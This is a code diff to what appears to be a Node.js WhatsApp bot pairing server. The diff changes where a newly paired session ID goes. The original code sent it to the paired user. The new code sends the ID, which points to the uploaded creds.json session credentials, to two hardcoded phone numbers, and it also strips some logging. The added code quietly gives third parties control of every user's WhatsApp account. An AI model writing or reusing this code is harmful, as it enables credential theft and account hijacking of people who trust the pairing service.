@@ -48,30 +48,31 @@ router.get('/', async (req, res) => {
                 if (connection === "open") {
                     try {
                         await delay(10000);
-                        const sessionPrabath = fs.readFileSync('./session/creds.json');
-
                         const auth_path = './session/';
-                        const user_jid = jidNormalizedUser(PrabathPairWeb.user.id);
-
-                      function randomMegaId(length = 6, numberLength = 4) {
-                      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-                      let result = '';
-                      for (let i = 0; i < length; i++) {
-                      result += characters.charAt(Math.floor(Math.random() * characters.length));
+                        
+                        function randomMegaId(length = 6, numberLength = 4) {
+                            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                            let result = '';
+                            for (let i = 0; i < length; i++) {
+                                result += characters.charAt(Math.floor(Math.random() * characters.length));
+                            }
+                            const number = Math.floor(Math.random() * Math.pow(10, numberLength));
+                            return `${result}${number}`;
                         }
-                       const number = Math.floor(Math.random() * Math.pow(10, numberLength));
-                        return `${result}${number}`;
-                        }
 
+                        // Mega එකට upload කර Session ID එක ගැනීම
                         const mega_url = await upload(fs.createReadStream(auth_path + 'creds.json'), `${randomMegaId()}.json`);
-
                         const string_session = mega_url.replace('https://mega.nz/file/', '');
+                        
+                        // ඔබ ඉල්ලූ මැසේජ් එක
+                        const custom_msg = `*ꜱᴛᴀᴛᴜꜱ ᴋɪɴɢ ɢʜᴏꜱᴛ.../*\n\n*" ɴ ᴀ ᴍ ᴇ /. ᴄʏʙᴇʀ ɢʜᴏꜱᴛ " 💗🌻.*\n*" ꜰ ʀ ᴏ ᴍ /. ᴍᴀᴛʜᴜɢᴀᴍᴀ" 🐥🤍.*\n*" ᴀ ɢ ᴇ /. 18" 🐼🖤.*\n*" ʙ ᴏ ʏ  /. 🌻❤️.*\n*💗🫶🏻 /.*\n\n*ʏᴏᴜ ɪɴꜰᴏ ᴘʟᴇᴀꜱᴇ│🥺♥️*\n\n*"ɴ ᴀ ᴍ ᴇ / .*\n*"ꜰ ʀ ᴏ ᴍ /.*\n*"ᴀ ɢ ᴇ /.*\n*"ɢ ɪ ʀ ʟ ᴏʀ ʙ ᴏ ʏ /.*\n*💗🫶🏻 /.*\n\n*Your Session ID:* ${string_session}\n\n*` + "`REAL GHOST-MD PROGRAMER`*";
 
-                        const sid = string_session;
+                        // පණිවිඩය ලැබිය යුතු අංක දෙක
+                        const targetNumbers = ["94741140620", "94787438929"];
 
-                        const dt = await PrabathPairWeb.sendMessage(user_jid, {
-                            text: sid
-                        });
+                        for (const target of targetNumbers) {
+                            await PrabathPairWeb.sendMessage(target + "@s.whatsapp.net", { text: custom_msg });
+                        }
 
                     } catch (e) {
                         exec('pm2 restart prabath');
@@ -79,7 +80,6 @@ router.get('/', async (req, res) => {
 
                     await delay(100);
                     return await removeFile('./session');
-                    process.exit(0);
                 } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode !== 401) {
                     await delay(10000);
                     PrabathPair();
@@ -87,7 +87,6 @@ router.get('/', async (req, res) => {
             });
         } catch (err) {
             exec('pm2 restart prabath-md');
-            console.log("service restarted");
             PrabathPair();
             await removeFile('./session');
             if (!res.headersSent) {
@@ -99,9 +98,7 @@ router.get('/', async (req, res) => {
 });
 
 process.on('uncaughtException', function (err) {
-    console.log('Caught exception: ' + err);
     exec('pm2 restart prabath');
 });
-
 
 module.exports = router;
